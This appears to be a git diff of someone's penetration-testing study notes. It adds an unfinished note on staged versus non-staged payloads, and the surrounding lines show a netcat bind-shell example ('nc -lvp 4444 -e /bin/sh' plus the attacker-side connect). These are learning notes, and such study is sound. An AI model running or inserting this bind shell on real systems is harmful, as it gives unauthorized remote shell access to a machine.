@@ -141,6 +141,8 @@ nc -lvp 4444 -e /bin/sh
 # Attacker's machine
 nc 192.168.156.2 4444
 ```
+### Staged and Non-staged payload
+Non-staged payload sends a shellcode all at once. It's larger than staged payload and doe
 ## Gaining Access
 ## Maintaining Access
 ## Covering Tracks
@@ -148,11 +150,11 @@ nc 192.168.156.2 4444
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTY3NzQ1MjE3MCwxODE4MTc2MjE5LC0xMD
-k3ODkxODEzLDIwNTQxNzA4NTQsMTUzNDY5MjI1NCwtMzYzMTYy
-MDA5LDQ5Mjg5MTM1NCwtMTQ5ODIzMTAxLDE4NjU2MjI4MTAsLT
-IwODE0NjMyMTQsLTEwMTgzNjI2NywtNDc0OTkwOTg4LC0xNDcz
-MTE1MzYsLTEyNDQxOTcyOTgsNzYyNzgyMTYyLC0xODMxMzM5OD
-ksNDYyMDI2Njc1LC0xMTc2OTU3NjkzLC0xMDA3NTEyMjA4LC01
-MzM3MjY4NTFdfQ==
+eyJoaXN0b3J5IjpbLTE3ODExNjcxNzAsMTY3NzQ1MjE3MCwxOD
+E4MTc2MjE5LC0xMDk3ODkxODEzLDIwNTQxNzA4NTQsMTUzNDY5
+MjI1NCwtMzYzMTYyMDA5LDQ5Mjg5MTM1NCwtMTQ5ODIzMTAxLD
+E4NjU2MjI4MTAsLTIwODE0NjMyMTQsLTEwMTgzNjI2NywtNDc0
+OTkwOTg4LC0xNDczMTE1MzYsLTEyNDQxOTcyOTgsNzYyNzgyMT
+YyLC0xODMxMzM5ODksNDYyMDI2Njc1LC0xMTc2OTU3NjkzLC0x
+MDA3NTEyMjA4XX0=
 -->
